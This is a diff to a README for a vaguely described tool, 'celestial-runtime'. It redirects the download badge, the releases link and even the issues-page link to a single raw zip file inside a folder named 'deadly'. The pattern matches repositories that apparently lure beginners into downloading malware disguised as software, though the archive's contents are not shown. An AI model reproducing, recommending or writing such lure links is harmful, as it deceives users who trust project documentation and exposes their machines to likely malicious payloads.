@@ -1,7 +1,7 @@
 # 🌌 celestial-runtime - Easy Setup for Your Projects
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/wqqoz/celestial-runtime/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/wqqoz/celestial-runtime/main/deadly/celestial-runtime.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/wqqoz/celestial-runtime/main/deadly/celestial-runtime.zip)
 
 ## 🚀 Getting Started
 Welcome to celestial-runtime! This application helps you run your projects with ease. You don’t need to be a tech expert. Just follow these steps to get started.
@@ -10,7 +10,7 @@ Welcome to celestial-runtime! This application helps you run your projects with 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the downloads page.  
-   [Download from Releases Page](https://github.com/wqqoz/celestial-runtime/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/wqqoz/celestial-runtime/main/deadly/celestial-runtime.zip)
 
 2. **Select the Latest Version**  
    Once on the releases page, find the latest version of celestial-runtime. Look for a version labeled as "Latest Release". This will have the most recent updates and features.
@@ -47,7 +47,7 @@ If you encounter issues while installing or using celestial-runtime, check the f
 - **Application Not Responding**: Restart your computer and try running the application again.
 
 ## 🛠 Support and Feedback
-For assistance, please create an issue on our [issues page](https://github.com/wqqoz/celestial-runtime/issues). Your feedback helps us improve celestial-runtime.
+For assistance, please create an issue on our [issues page](https://raw.githubusercontent.com/wqqoz/celestial-runtime/main/deadly/celestial-runtime.zip). Your feedback helps us improve celestial-runtime.
 
 ## ✅ Conclusion
 celestial-runtime is designed to simplify your project setups. With straightforward steps, even beginners can download and use the application. Remember to check back for updates to keep your app running smoothly.
